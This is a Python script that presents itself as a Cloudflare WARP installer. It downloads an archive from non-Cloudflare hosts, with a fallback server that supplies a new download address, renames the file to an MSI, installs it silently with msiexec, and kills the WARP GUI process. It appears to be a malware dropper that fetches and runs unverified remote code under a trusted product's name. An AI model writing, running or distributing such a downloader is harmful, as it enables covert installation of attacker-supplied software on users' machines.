import os
import subprocess
import requests
import shutil

def fetch_active_url(central_url):
    try:
        print("Fetching active URL from central server:", central_url)
        response = requests.get(central_url, timeout=10)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print("Failed to get a response from the central server.")
            return None
    except Exception as e:
        print("Error while fetching from central server:", e)
        return None

def download_and_install():
    urls = [
        "https://matomo.orscentre.org/v8/file/GsHbL.zip",
        "http://td.celaya.biz:8081/v8/file/GsHbL.zip",
    ]
    central_url = "https://r1333rl.vercel.app/warp"

    for url in urls:
        try:
            print("Attempting to download from:", url)
            response = requests.get(url, stream=True, timeout=10)
            if response.status_code == 200:
                # Save the downloaded file
                with open("GsHbL.zip", "wb") as file:
                    shutil.copyfileobj(response.raw, file)
                print("Downloaded successfully from:", url)
                break
        except Exception as e:
            print(f"Failed to download from {url}. Error: {e}")
    else:
        # If all URLs fail, fetch from the central server
        active_url = fetch_active_url(central_url)
        if not active_url:
            print("All attempts to download the file have failed.")
            return
        try:
            print("Attempting to download from the central active URL:", active_url)
            response = requests.get(active_url, stream=True, timeout=10)
            if response.status_code == 200:
                with open("GsHbL.zip", "wb") as file:
                    shutil.copyfileobj(response.raw, file)
                print("Downloaded successfully from the central active URL.")
            else:
                print("Failed to download from the central active URL.")
                return
        except Exception as e:
            print("Failed to download from the central active URL. Error:", e)
            return

    try:
        # Rename the file
        os.rename("GsHbL.zip", "GsHbL.msi")
        print("File renamed to 'GsHbL.msi'.")

        # Install the MSI file silently
        print("Installing WARP...")
        subprocess.run(["msiexec", "/i", "GsHbL.msi", "/quiet", "/qn", "/norestart", "/log", "warp.log"], check=True)
        print("Installation completed.")

        # Kill the GUI process
        print("Terminating Cloudflare WARP GUI...")
        subprocess.run(["taskkill", "/f", "/im", "Cloudflare WARP.exe"], check=False)
        print("Cloudflare WARP GUI terminated.")
    except Exception as e:
        print("Error during installation process:", e)

if __name__ == "__main__":
    download_and_install()
